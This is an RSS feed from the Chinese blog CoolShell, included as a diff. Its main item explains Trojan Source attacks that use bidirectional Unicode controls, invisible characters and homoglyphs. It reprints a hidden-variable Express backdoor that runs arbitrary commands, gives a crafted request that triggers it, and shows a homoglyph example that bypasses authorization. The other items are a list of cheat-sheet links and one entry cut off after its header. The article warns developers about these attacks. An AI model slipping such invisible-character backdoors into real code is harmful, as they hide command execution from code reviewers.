@@ -1,0 +1,462 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Unicode | 酷 壳 - CoolShell</title>
+	<atom:link href="https://coolshell.cn/tag/unicode/feed" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Sat, 12 Feb 2022 05:30:38 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>源代码特洛伊木马攻击</title>
+		<link>https://coolshell.cn/articles/21649.html</link>
+					<comments>https://coolshell.cn/articles/21649.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 19 Nov 2021 09:02:46 +0000</pubDate>
+				<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[hacker]]></category>
+		<category><![CDATA[Unicode]]></category>
+		<category><![CDATA[木马]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=21649</guid>
+
+					<description><![CDATA[<p>最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/21649.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/21649.html">源代码特洛伊木马攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-full wp-image-21658" src="https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg" alt="" width="340" height="270" srcset="https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg 340w, https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv-300x238.jpg 300w" sizes="(max-width: 340px) 100vw, 340px" />最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21652" src="https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg" alt="" width="640" height="206" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-300x96.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-768x247.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-604x194.jpg 604w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427.jpg 1288w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a title="ISO/IEC 8859-6" href="https://en.wikipedia.org/wiki/ISO/IEC_8859-6">ISO/IEC 8859-6</a>和<a title="ISO/IEC 8859-8" href="https://en.wikipedia.org/wiki/ISO/IEC_8859-8">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>
+<p><span id="more-21649"></span></p>
+<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>
+<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href="https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/" target="_blank" rel="noopener">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>
+<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
+
+import "fmt"
+
+func main() {
+  str, mask := "Hello, World!‮10x‭", 0
+
+  bits := 0
+  for _, ch := range str {
+    for ch &gt; 0 {
+      bits += int(ch) &amp; mask
+      ch = ch &gt;&gt; 1
+    }
+  }
+  fmt.Println("Total bits set:", bits)
+}</pre>
+<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  &#8211;<a href="https://play.golang.org/p/e2BDZvFlet0" target="_blank" rel="noopener"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>
+<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21653" src="https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg" alt="" width="500" height="324" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg 902w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-300x194.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-768x497.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-417x270.jpg 417w" sizes="(max-width: 500px) 100vw, 500px" /></p>
+<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href="https://www.compart.com/en/unicode/bidiclass" target="_blank" rel="noopener">Unicode Bidirectional Classes</a>）：</p>
+<ul>
+<li><strong>U+202E &#8211; Right-to-Left Override [RLO] </strong><br />
+表示，开始从右到左显示，于是，接下来的文本 <code>10x", 0</code> 变成了 <code>0 ,"x01</code></li>
+<li><strong>U+202D &#8211; Left-to-Right Override [LRO]</strong><br />
+表示，开始从左到右显示，于是，<code>0,"x01</code> 中的前4个字符<code>0 ,"</code> 反转成  <code>", 0</code>，于是整个文本成了 <code>", 0x01</code></li>
+</ul>
+<p>所以，你在视觉上看到的是结果是—— <code>"Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>
+<p>然后，Github官方博客中还给了一个安全问题 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574">CVE-2021-42574</a> ——</p>
+<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>
+<p>这个安全问题在剑桥大学的这篇论文“<a href="https://www.trojansource.codes/" target="_blank" rel="noopener">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>
+<p>通过双向文本可以把下面这段代码：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21655" src="https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg" alt="" width="569" height="240" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-604x255.jpg 604w" sizes="(max-width: 569px) 100vw, 569px" /></p>
+<p>伪装成下面的这个样子：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21654" src="https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg" alt="" width="580" height="245" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-604x255.jpg 604w" sizes="(max-width: 580px) 100vw, 580px" /></p>
+<p>在图 2 中<code>'alice'</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>
+<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> &#8211; </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>
+<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href="https://certitude.consulting/blog/en/invisible-backdoor/" target="_blank" rel="noopener">The Invisible Javascript Backdoor</a>”里的这个示例：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">const express = require('express');
+const util = require('util');
+const exec = util.promisify(require('child_process').exec);
+
+const app = express();
+
+app.get('/network_health', async (req, res) =&gt; {
+    const { timeout,ㅤ} = req.query;
+    const checkCommands = [
+        'ping -c 1 google.com',
+        'curl -s http://example.com/',ㅤ
+    ];
+
+    try {
+        await Promise.all(checkCommands.map(cmd =&gt; 
+                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));
+        res.status(200);
+        res.send('ok');
+    } catch(e) {
+        res.status(500);
+        res.send('failed');
+    }
+});
+
+app.listen(8080);</pre>
+<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>
+<p>然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21656" src="https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg" alt="" width="640" height="577" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-300x270.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-768x692.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-299x270.jpg 299w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683.jpg 1118w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>
+<p style="text-align: center;"><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>
+<p>其中的，%E3%85%A4 就是 <code>\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>
+<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="c">if(environmentǃ=ENV_PROD){
+    // bypass authZ checks in DEV
+    return true;
+}</pre>
+<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>
+<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>
+<p>（全文完）</p>
+<p>&nbsp;</p>
+<p>&nbsp;<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/2439.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg" alt="黑客的价值观" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2439.html" class="wp_rp_title">黑客的价值观</a></li><li ><a href="https://coolshell.cn/articles/1957.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg" alt="Web程序的最佳测试数据" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1957.html" class="wp_rp_title">Web程序的最佳测试数据</a></li><li ><a href="https://coolshell.cn/articles/1331.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg" alt="Unicode字符预览表" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1331.html" class="wp_rp_title">Unicode字符预览表</a></li><li ><a href="https://coolshell.cn/articles/4131.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/6.jpg" alt="WSDL 1.1 中文规范" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4131.html" class="wp_rp_title">WSDL 1.1 中文规范</a></li><li ><a href="https://coolshell.cn/articles/5444.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="千万不要把 bool 设计成函数参数" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5444.html" class="wp_rp_title">千万不要把 bool 设计成函数参数</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/21649.html">源代码特洛伊木马攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/21649.html/feed</wfw:commentRss>
+			<slash:comments>23</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Web开发人员速查卡</title>
+		<link>https://coolshell.cn/articles/3684.html</link>
+					<comments>https://coolshell.cn/articles/3684.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Wed, 16 Feb 2011 10:59:06 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[Apache]]></category>
+		<category><![CDATA[ASP]]></category>
+		<category><![CDATA[Cheat Sheet]]></category>
+		<category><![CDATA[CSS]]></category>
+		<category><![CDATA[Flash]]></category>
+		<category><![CDATA[HTML]]></category>
+		<category><![CDATA[Javascript]]></category>
+		<category><![CDATA[jQuery]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Unicode]]></category>
+		<category><![CDATA[Web]]></category>
+		<category><![CDATA[XML]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=3684</guid>
+
+					<description><![CDATA[<p>无论你是多牛的程序员，你都无法记住所有的东西。而很多时候，查找某些知识又比较费事。所以，网上有很多Cheat Sheets，翻译成小抄也好 ，速查卡也好，总之就...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/3684.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/3684.html">Web开发人员速查卡</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>无论你是多牛的程序员，你都无法记住所有的东西。而很多时候，查找某些知识又比较费事。所以，网上有很多Cheat Sheets，翻译成小抄也好 ，速查卡也好，总之就是帮你节省 时间的。之前给大家介绍过<a rel="bookmark" href="https://coolshell.cn/articles/870.html" target="_blank">Web设计的速查卡</a>、<a rel="bookmark" href="https://coolshell.cn/articles/2964.html" target="_blank">25个jQuery的编程小抄</a>，还有<a rel="bookmark" href="https://coolshell.cn/articles/1566.html" target="_blank">程序员小抄大全</a>，今天转一篇开发人员的速查卡，<a href="http://www.topdesignmag.com/all-the-cheat-sheets-that-a-web-developer-needs/" target="_blank">源文在这里</a>。下面的文章我就不翻译了。</p>
+<h2>HTML Cheat Sheet</h2>
+<p><img decoding="async" loading="lazy" title="1" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/1128.jpg" alt="" width="450" height="127" /></p>
+<ul>
+<li><a href="http://www.html.su/" target="_blank">HTML/XTML in one page</a></li>
+<li><a href="http://refcardz.dzone.com/refcardz/html5-new-standards-web-interactivity" target="_blank">HTML5: The Evolution of Web Standards by James Sugrue</a></li>
+<li><a href="http://www.elizabethcastro.com/html/extras/xhtml_ref.html" target="_blank">(X)HTML Elements and Attributes</a></li>
+<li><a href="http://www.w3.org/QA/2002/04/valid-dtd-list.html" target="_blank">Doctype Declarations (DTDs)</a></li>
+<li><a href="http://www.digitalmediaminute.com/reference/entity/index.php" target="_blank">XHTML Character Entity Reference</a></li>
+<li><a href="http://downloads.gosquared.com/help_sheets/08/HTML-Help-Sheet-02.jpg" target="_blank">GoSquared HTML Help Sheet</a></li>
+</ul>
+<p><span id="more-3684"></span></p>
+<p><strong> </strong></p>
+<h2>CSS Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="2" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/2104.jpg" alt="" width="451" height="112" /></p>
+<ul>
+<li><a href="http://www.css.su/" target="_blank">CSS in one page</a></li>
+<li><a href="http://www.elizabethcastro.com/html/extras/cssref.html" target="_blank">CSS Properties and Values</a></li>
+<li><a href="http://www.blooberry.com/indexdot/css/propindex/all.htm" target="_blank">All CSS Properties Listed Alphabetically</a></li>
+<li><a href="http://www.dustindiaz.com/css-shorthand/" target="_blank">CSS Shorthand Guide</a></li>
+<li><a href="http://www.gosquared.com/liquidicity/archives/1010" target="_blank">GoSquared CSS Help Sheet</a></li>
+</ul>
+<h2>Adobe Flash Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="3" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/312.png" alt="" width="449" height="87" /></p>
+<ul>
+<li><a href="http://michaeldoyle.eu/blog/wp-content/uploads/2009/10/flash-cheat-sheet.pdf" target="_blank">Flash Cheat Sheet</a></li>
+<li><a href="http://edutechwiki.unige.ch/en/Flash_CS3_keyboard_shortcuts" target="_blank">Flash CS3 Keyboard Shortcuts</a></li>
+</ul>
+<p><strong> </strong></p>
+<h2><strong>ASP Cheat Sheets</strong></h2>
+<h2><strong><img decoding="async" loading="lazy" title="4" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/430.jpg" alt="" width="451" height="106" /><br />
+</strong></h2>
+<ul>
+<li><a href="http://refcardz.dzone.com/refcardz/core-aspnet" target="_blank">Core ASP.NET</a></li>
+<li><a href="http://www.newdrp.com/Posters/Development/tabid/67/id/284/Default.aspx" target="_blank">ASP.NET MVC Framework Cheat Sheet</a></li>
+<li><a href="http://www.newdrp.com/Posters/Development/tabid/67/id/286/Default.aspx" target="_blank">ASP.NET MVC View Cheat Sheet</a></li>
+</ul>
+<h2>PHP Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="5" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/55.png" alt="" width="450" height="112" /></p>
+<ul>
+<li><a href="http://www.dreamincode.net/forums/topic/35660-php-quick-reference-cheat-sheet/" target="_blank">PHP Basics Quick Reference Sheet</a></li>
+<li><a href="http://www.digilife.be/quickreferences/QRC/PHP%20Cheat%20Sheet.pdf" target="_blank">PHP Cheat Sheet</a></li>
+<li><a href="http://www.sk89q.com/content/2010/04/phpsec_cheatsheet.pdf" target="_blank">PHP Security Cheat Sheet</a></li>
+<li><a title="PHP Variable and Array Tests (php version 5.1.6) by Barry Hunter" href="http://www.deformedweb.co.uk/php_variable_tests.php" target="_blank">PHP Variable and Array Tests</a></li>
+<li><a href="http://downloads.gosquared.com/help_sheets/08/PHP-Help-Sheet-01.jpg" target="_blank">GoSquared PHP Help Sheet</a></li>
+</ul>
+<h2>MySQL Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="6" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/65.png" alt="" width="450" height="89" /></p>
+<ul>
+<li><a href="http://www.addedbytes.com/cheat-sheets/mysql-cheat-sheet/" target="_blank">MySQL Cheat Sheet by Dave Child</a></li>
+<li><a href="http://www.cheat-sheets.org/saved-copy/MySQL_QuickRef.pdf" target="_blank">MySQL Database Quick Reference</a></li>
+<li><a href="http://www.sqltutorial.org/sql-cheat-sheet.aspx" target="_blank">SQL Statements Cheat Sheet</a></li>
+</ul>
+<h2>JavaScript Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="7" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/75.png" alt="" width="451" height="118" /></p>
+<ul>
+<li><a href="http://www.javascript.su/" target="_blank">JavaScript in one page</a></li>
+<li><a href="http://www.addedbytes.com/cheat-sheets/javascript-cheat-sheet/" target="_blank">JavaScript Cheat Sheet</a></li>
+<li><a href="http://wps.aw.com/wps/media/objects/2234/2287950/javascript_refererence.pdf" target="_blank">Addison-Wesley’s JavaScript Reference Card</a></li>
+</ul>
+<h2>jQuery Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="8" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/85.png" alt="" width="450" height="109" /></p>
+<ul>
+<li><a href="http://colorcharge.com/jquery/" target="_blank">jQuery Cheatsheet</a></li>
+<li><a href="http://woork.blogspot.com/2009/09/jquery-visual-cheat-sheet.html" target="_blank">jQuery 1.3 Visual Cheat Sheet by Antonio Lupetti</a></li>
+<li><a href="http://refcardz.dzone.com/refcardz/jquery-selectors" target="_blank">jQuery Selectors by Bear Bibeault &amp; Yehuda Katz</a></li>
+</ul>
+<h2>Unicode Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="9" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/97.png" alt="" width="450" height="112" /></p>
+<ul>
+<li><a href="http://www.utf.ru/" target="_blank">The Unicode Character Code</a></li>
+<li><a href="http://www.visibone.com/htmlref/char/cer.htm" target="_blank">HTML Characters, Numeric Codes, 0-65535 by Bob Stein</a></li>
+</ul>
+<h2>XML Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="10" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/106.png" alt="" width="450" height="111" /></p>
+<ul>
+<li><a href="http://www.xml.su/" target="_blank">XML in one page</a></li>
+<li><a href="http://www.mulberrytech.com/quickref/XMLquickref.pdf" target="_blank">XML 1.0 Syntax Quick Reference by Mulberry Technologies</a></li>
+</ul>
+<h2>mod_rewrite and .htaccess Cheat Sheets</h2>
+<p><img decoding="async" loading="lazy" title="11" src="http://www.topdesignmag.com/wp-content/uploads/2011/01/1111.png" alt="" width="455" height="95" /></p>
+<ul>
+<li><a href="http://www.addedbytes.com/cheat-sheets/mod_rewrite-cheat-sheet/" target="_blank">mod_rewrite Cheat Sheet by Dave Child</a></li>
+<li><a href="http://www.thejackol.com/htaccess-cheatsheet/" target="_blank">htaccess Cheatsheet</a></li>
+</ul>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="开源中最好的Web开发的资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_title">开源中最好的Web开发的资源</a></li><li ><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/05/Render-Process-150x150.jpg" alt="浏览器的渲染原理简介" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a></li><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li><li ><a href="https://coolshell.cn/articles/1949.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg" alt="Web中的省略号" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1949.html" class="wp_rp_title">Web中的省略号</a></li><li ><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/pretty-code-150x150.gif" alt="Chrome开发者工具的小技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a></li><li ><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/03/css-layouts-150x150.gif" alt="CSS 布局:40个教程、技巧、例子和最佳实践" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_title">CSS 布局:40个教程、技巧、例子和最佳实践</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/3684.html">Web开发人员速查卡</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/3684.html/feed</wfw:commentRss>
+			<slash:comments>22</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Web程序的最佳测试数据</title>
+		<link>https://coolshell.cn/articles/1957.html</link>
+					<comments>https://coolshell.cn/articles/1957.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 15 Dec 2009 07:50:35 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[HTML]]></category>
+		<category><![CDATA[JSON]]></category>
+		<category><![CDATA[SQL]]></category>
+		<category><![CDATA[Unicode]]></category>
+		<category><![CDATA[转义]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1957</guid>
+
+					<description><![CDATA[<p>这里有一篇Matthias写的关于转义字符文章-“The art of escaping”，这篇文章告诉你有一些比较特殊的字符需要你去认真的处理，不然，你的网站...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1957.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1957.html">Web程序的最佳测试数据</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script></p>
